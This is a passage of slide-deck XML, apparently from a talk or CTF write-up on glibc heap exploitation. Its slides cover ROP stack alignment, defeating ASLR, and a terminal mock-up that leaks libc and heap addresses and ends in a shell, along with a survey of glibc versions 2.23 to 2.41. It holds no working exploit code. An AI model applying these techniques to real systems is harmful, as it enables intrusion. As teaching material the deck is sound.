              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="E6E8EB"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:srgbClr val="E6E8EB"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="118000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="3FB950"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="3FB950"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>rsp % 16 == 0</a:t>
            </a:r>
            <a:endParaRPr sz="130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lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="3FB950"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>shell</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="270" name="Google Shape;270;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="489204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700"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr i="1" lang="en-US" sz="1700">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>A single ret nudges rsp by 8. — because the core told us the parity.</a:t>
            </a:r>
            <a:endParaRPr sz="17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75" name="Shape 275"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="276" name="Google Shape;276;p19"/>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IV · THE LESSON</a:t>
            </a:r>
            <a:endParaRPr sz="1100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="277" name="Google Shape;277;p19"/>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19 / 27</a:t>
            </a:r>
            <a:endParaRPr sz="900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="278" name="Google Shape;278;p19"/>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Why "just add a ret" is sometimes wrong</a:t>
            </a:r>
            <a:endParaRPr sz="3400">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="279" name="Google Shape;279;p19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="1737360"/>
            <a:ext cx="1115568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800"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>» </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>The parity you need depends on where your chain STARTS.</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="E3B341"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>» </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Enter with rsp 16-aligned and an extra ret puts you back to 8 — you re-break it.</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="E3B341"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>» </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>"Add a ret" is a coin flip if you don't know your alignment. The core removes the guessing.</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="280" name="Google Shape;280;p19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="-660000">
            <a:off x="8229600" y="4754880"/>
            <a:ext cx="3108960" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:srgbClr val="E5484D"/>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5484D"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="E5484D"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>CAUSE: rsp≡8</a:t>
            </a:r>
            <a:endParaRPr sz="1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85" name="Shape 285"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="286" name="Google Shape;286;p20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="1097280"/>
            <a:ext cx="12191695"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42C"/>
              </a:buClr>
              <a:buSzPts val="21000"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="21000">
                <a:solidFill>
                  <a:srgbClr val="20242C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>ACT V</a:t>
            </a:r>
            <a:endParaRPr sz="21000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="287" name="Google Shape;287;p20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="233172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500"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500">
                <a:solidFill>
                  <a:srgbClr val="3FB950"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>ACT V</a:t>
            </a:r>
            <a:endParaRPr sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="288" name="Google Shape;288;p20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="2743200"/>
            <a:ext cx="111556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5200"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="5200">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>The Payoff</a:t>
            </a:r>
            <a:endParaRPr sz="5200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="289" name="Google Shape;289;p20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="388620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400"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>ASLR on. One write. A shell.</a:t>
            </a:r>
            <a:endParaRPr sz="1400">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="290" name="Google Shape;290;p20"/>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20 / 27</a:t>
            </a:r>
            <a:endParaRPr sz="9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295" name="Shape 295"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="296" name="Google Shape;296;p21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="457195"/>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
        <p:nvSpPr>
          <p:cNvPr id="297" name="Google Shape;297;p21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="914400"/>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2800"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="2800">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Full chain — end to end</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="298" name="Google Shape;298;p21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="1691640"/>
            <a:ext cx="11155680" cy="3566160"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 1282"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1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="704088" y="1837944"/>
            <a:ext cx="10753344" cy="327355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 make run</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 libc base : 0x7f…000     [+] heap base : 0x…000</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 environ   : 0x7ffe…       [+] main RIP  @ environ-0x1XX</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 shell popped -- life after the hooks</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 whoami</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bl4ckp4r4d1s3</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 uname -r ; echo pwned</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6.x-kali …   pwned</a:t>
            </a:r>
            <a:endParaRPr sz="1250">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="300" name="Google Shape;300;p21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="53492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300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>ASLR on · self-tunes to the box's glibc · 10/10</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="301" name="Google Shape;301;p21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="-660000">
            <a:off x="8869680" y="5440680"/>
            <a:ext cx="3108960" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:srgbClr val="3FB95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3FB950"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="3FB950"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>SHELL — 10/10</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="302" name="Google Shape;302;p21"/>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21 / 27</a:t>
            </a:r>
            <a:endParaRPr sz="9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307" name="Shape 307"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="308" name="Google Shape;308;p22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="1097280"/>
            <a:ext cx="12191695" cy="2926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242C"/>
              </a:buClr>
              <a:buSzPts val="21000"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="21000">
                <a:solidFill>
                  <a:srgbClr val="20242C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>ACT VI</a:t>
            </a:r>
            <a:endParaRPr sz="21000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="309" name="Google Shape;309;p22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="233172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500"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>ACT VI</a:t>
            </a:r>
            <a:endParaRPr sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="310" name="Google Shape;310;p22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="2743200"/>
            <a:ext cx="111556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5200"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="5200">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>The Evidence Board</a:t>
            </a:r>
            <a:endParaRPr sz="5200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="311" name="Google Shape;311;p22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="3886200"/>
            <a:ext cx="11155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400"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>What lived. What died.</a:t>
            </a:r>
            <a:endParaRPr sz="1400">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="312" name="Google Shape;312;p22"/>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22 / 27</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317" name="Shape 317"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="318" name="Google Shape;318;p23"/>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VI · THE BOARD</a:t>
            </a:r>
            <a:endParaRPr sz="1100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="319" name="Google Shape;319;p23"/>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23 / 27</a:t>
            </a:r>
            <a:endParaRPr sz="900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="320" name="Google Shape;320;p23"/>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000"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="3000">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>What survives, 2.23 → 2.41</a:t>
            </a:r>
            <a:endParaRPr sz="3000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="321" name="Google Shape;321;p23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3977640"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2.23</a:t>
            </a:r>
            <a:endParaRPr sz="1200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="322" name="Google Shape;322;p23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5047488"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2.26</a:t>
            </a:r>
            <a:endParaRPr sz="1200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="323" name="Google Shape;323;p23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6117336"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2.29</a:t>
            </a:r>
            <a:endParaRPr sz="1200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="324" name="Google Shape;324;p23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7187184"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2.32</a:t>
            </a:r>
            <a:endParaRPr sz="1200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="325" name="Google Shape;325;p23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8257032"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2.34</a:t>
            </a:r>
            <a:endParaRPr sz="1200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
